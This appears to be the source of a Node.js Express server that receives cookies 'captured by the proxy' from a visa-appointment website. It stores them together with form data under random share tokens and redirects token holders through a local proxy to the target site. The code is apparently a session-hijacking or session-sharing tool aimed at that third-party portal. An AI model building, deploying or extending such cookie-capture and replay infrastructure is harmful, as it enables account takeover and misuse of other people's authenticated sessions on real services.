const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000; // Use port 3000 for Render

// Enable CORS for specific origin
app.use(cors({
    origin: 'http://southafrica.blsspainglobal.com', // Allow requests from this domain
    methods: ['GET', 'POST', 'OPTIONS'], // Allow these HTTP methods
    credentials: true, // Allow cookies and credentials
    allowedHeaders: ['Content-Type', 'Authorization'], // Allow these headers
}));

// Middleware to parse URL-encoded and JSON data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Store session data in memory (replace with a database in production)
const sessions = {};

// Store cookies in memory (replace with a database in production)
let capturedCookies = null;

// Endpoint to store cookies captured by the proxy
app.post('/store-cookies', (req, res) => {
    console.log('Received request at /store-cookies:', req.body); // Log the request body

    const { cookies } = req.body;

    if (!cookies) {
        console.error('Missing cookies in request body');
        return res.status(400).json({ error: 'Missing cookies in request body' });
    }

    // Store the cookies
    capturedCookies = cookies;
    console.log('Stored Cookies:', capturedCookies);

    res.status(200).json({ message: 'Cookies stored successfully' });
});

// Endpoint to generate a shareable token
app.post('/generate-token', (req, res) => {
    console.log('Received request at /generate-token:', req.body); // Log the request body

    const { url, formData } = req.body;

    // Validate required fields
    if (!url || !formData) {
        console.error('Missing required fields:', { url, formData });
        return res.status(400).json({ error: 'Missing required fields: url or formData' });
    }

    // Use stored cookies if available
    const cookies = capturedCookies || 'No cookies captured';

    const sessionData = {
        url,
        cookies,
        formData,
        timestamp: new Date().toISOString(),
    };

    const token = Math.random().toString(36).substring(2, 15); // Generate a random token
    sessions[token] = sessionData; // Store session data

    const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Replace with your Render app URL
    console.log('Generated shareable link:', shareableLink);

    res.status(200).json({ token, shareableLink }); // Send response
});

// Endpoint to retrieve session data and redirect through the proxy
app.get('/share', (req, res) => {
    console.log('Received request at /share:', req.query); // Log the request query

    const token = req.query.token;
    const sessionData = sessions[token];

    if (!token || !sessionData) {
        console.error('Invalid or expired token:', token);
        return res.status(404).send('Invalid or expired token');
    }

    // Construct the full URL for the proxy server
    const targetUrl = new URL(sessionData.url, 'https://southafrica.blsspainglobal.com').toString();
    const proxyUrl = `http://localhost:3001${new URL(targetUrl).pathname}`;

    console.log('Redirecting to:', proxyUrl);
    res.redirect(proxyUrl);
});

// Clean up old sessions every hour
setInterval(() => {
    const now = new Date();
    Object.keys(sessions).forEach(token => {
        const session = sessions[token];
        const sessionTime = new Date(session.timestamp);
        if (now - sessionTime > 3600000) { // 1 hour
            delete sessions[token];
            console.log('Deleted expired session:', token);
        }
    });
}, 3600000);

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
